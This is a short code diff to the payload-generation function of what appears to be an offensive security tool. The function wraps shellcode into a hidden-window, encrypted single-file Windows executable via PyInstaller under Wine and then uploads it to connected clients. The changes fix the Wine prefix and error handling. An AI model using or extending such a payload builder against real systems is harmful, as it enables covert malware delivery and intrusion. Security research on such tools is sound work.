@@ -66,9 +66,8 @@ def GeneratePayload(ez2read_shellcode,payloadname,shellcode):
         Filesave.close()
     print '[*] Creating Payload using Pyinstaller...'
 
-
-    p = subprocess.Popen(['wine', os.path.expanduser('~') + '/.wine/drive_c/Python27/python.exe', '/opt/pyinstaller/pyinstaller.py',
-                          '%s/%s.py' % (payloaddir(), randoFileName), '--noconsole', '--onefile', '--key',randomenckey], bufsize=1024, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    p = subprocess.Popen(['wine', os.path.expanduser('~') + '/.win32/drive_c/Python27/python.exe', '/opt/pyinstaller/pyinstaller.py',
+                          '%s/%s.py' % (payloaddir(), randoFileName), '--noconsole', '--onefile', '--key', randomenckey], env=dict(os.environ, **{'WINEARCH':'win32','WINEPREFIX':os.path.expanduser('~') + '/.win32'}), bufsize=1024, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     LOADING = Spinner('Generating Payload')
     while p.poll() == None:
         LOADING.Update()
@@ -80,7 +79,13 @@ def GeneratePayload(ez2read_shellcode,payloadname,shellcode):
     if len(sys.argv) > 1:
         if sys.argv[1] == "-debug":
             sys.stdout.write(payloadstderr)
-    os.system('mv dist/%s.exe %s/%s.exe'% (randoFileName, payloaddir(), randoFileName))
+    try:
+        os.rename('dist/%s.exe' % randoFileName, '%s/%s.exe' % (payloaddir(), randoFileName))
+    except OSError:
+        print t.bold_red + "[!] Error while creating payload..." + t.normal
+        print payloadstderr
+        return False
+
     print t.normal + '\n[*] Payload.exe Has Been Generated And Is Located Here: ' + t.bold_green + '%s/%s.exe' % (payloaddir(), randoFileName) + t.normal
     CleanUpPayloadMess(randoFileName)
     from menu import clientMenuOptions
@@ -89,6 +94,7 @@ def GeneratePayload(ez2read_shellcode,payloadname,shellcode):
         clientUpload((payloaddir() + '/' + randoFileName), powershellExec=ez2read_shellcode, isExe=True, json='{"type":"", "data":"%s", "sendoutput":"false", "multiple":"true"}')
     else:
         DoPayloadUpload(randoFileName)
+    return True
 
 
 def CleanUpPayloadMess(randoFileName):
